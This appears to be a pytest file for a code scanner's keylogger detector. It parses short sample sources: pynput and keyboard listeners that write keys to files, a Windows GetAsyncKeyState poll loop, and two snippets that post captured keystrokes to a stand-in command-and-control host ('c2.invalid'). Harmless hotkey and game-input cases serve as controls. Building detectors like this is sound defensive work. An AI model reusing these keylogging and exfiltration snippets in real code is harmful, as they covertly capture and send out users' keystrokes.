"""Keystrokes captured and written down or sent (`flows/key_capture.py`).

Every source is assembled for the test and only parsed. The twins map a key to an action, or read a
key to move something."""

from __future__ import annotations

from cordon_scanner.analysis.python.pyast import PythonAnalyzer


class Kit:
    @staticmethod
    def logged(source: str) -> list[str]:
        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail == "keystrokes logged"]


class TestAKeylogger:
    def test_a_pynput_listener_that_writes_the_keys(self) -> None:
        source = (
            "from pynput import keyboard\n"
            "def on_press(key):\n"
            "    with open('log.txt', 'a') as f:\n"
            "        f.write(str(key))\n"
            "with keyboard.Listener(on_press=on_press) as listener:\n"
            "    listener.join()\n"
        )
        assert Kit.logged(source) == ["keystrokes logged"]

    def test_a_buffer_flushed_to_a_file(self) -> None:
        source = (
            "import keyboard\n"
            "class Capture:\n"
            "    def __init__(self, path):\n"
            "        self.path = path\n"
            "        self.buffer = ''\n"
            "    def _add(self, event):\n"
            "        self.buffer += event.name\n"
            "    def _flush(self):\n"
            "        with open(self.path, 'a') as f:\n"
            "            f.write(self.buffer)\n"
            "        self.buffer = ''\n"
            "    def run(self):\n"
            "        keyboard.on_press(self._add)\n"
        )
        assert Kit.logged(source) == ["keystrokes logged"]

    def test_a_poll_of_key_state_whose_code_is_kept_and_sent(self) -> None:
        source = (
            "import ctypes, requests\n"
            "def loop():\n"
            "    seen = ''\n"
            "    for code in range(8, 256):\n"
            "        if ctypes.windll.user32.GetAsyncKeyState(code):\n"
            "            seen += chr(code)\n"
            "    requests.post('https://c2.invalid/k', data=seen)\n"
        )
        assert Kit.logged(source) == ["keystrokes logged"]

    def test_a_poll_whose_result_is_kept(self) -> None:
        source = (
            "import ctypes\n"
            "def loop(f):\n"
            "    while True:\n"
            "        state = ctypes.windll.user32.GetAsyncKeyState(65)\n"
            "        f.write(str(state))\n"
        )
        assert Kit.logged(source) == ["keystrokes logged"]


class TestOrdinaryKeyHandling:
    def test_a_hotkey_that_maps_a_key_to_an_action(self) -> None:
        source = (
            "from pynput import keyboard\n"
            "def on_press(key):\n"
            "    if key == keyboard.Key.esc:\n"
            "        stop()\n"
            "with keyboard.Listener(on_press=on_press) as l:\n"
            "    l.join()\n"
        )
        assert Kit.logged(source) == []

    def test_a_key_that_moves_a_sprite(self) -> None:
        source = (
            "import keyboard\n"
            "def step(player):\n"
            "    if keyboard.is_pressed('left'):\n"
            "        player.x -= 1\n"
        )
        assert Kit.logged(source) == []

    def test_a_file_write_unrelated_to_the_keys(self) -> None:
        source = (
            "from pynput import keyboard\n"
            "def on_press(key):\n"
            "    if key == keyboard.Key.esc:\n"
            "        with open('state.txt', 'w') as f:\n"
            "            f.write('stopped')\n"
        )
        assert Kit.logged(source) == []

    def test_a_robot_teleop_that_queues_the_keys(self) -> None:
        source = (
            "import queue\n"
            "from pynput import keyboard\n"
            "commands = queue.Queue()\n"
            "def on_press(key):\n"
            "    commands.put(key)\n"
            "with keyboard.Listener(on_press=on_press) as l:\n"
            "    l.join()\n"
        )
        assert Kit.logged(source) == []

    def test_a_terminal_that_echoes_the_keys(self) -> None:
        source = (
            "import sys\n"
            "from pynput import keyboard\n"
            "def on_press(key):\n"
            "    sys.stdout.write(str(key))\n"
            "with keyboard.Listener(on_press=on_press) as l:\n"
            "    l.join()\n"
        )
        assert Kit.logged(source) == []

    def test_a_key_posted_to_a_server(self) -> None:
        source = (
            "import requests\n"
            "from pynput import keyboard\n"
            "def on_press(key):\n"
            "    requests.post('https://c2.invalid/k', data=str(key))\n"
            "with keyboard.Listener(on_press=on_press) as l:\n"
            "    l.join()\n"
        )
        assert Kit.logged(source) == ["keystrokes logged"]
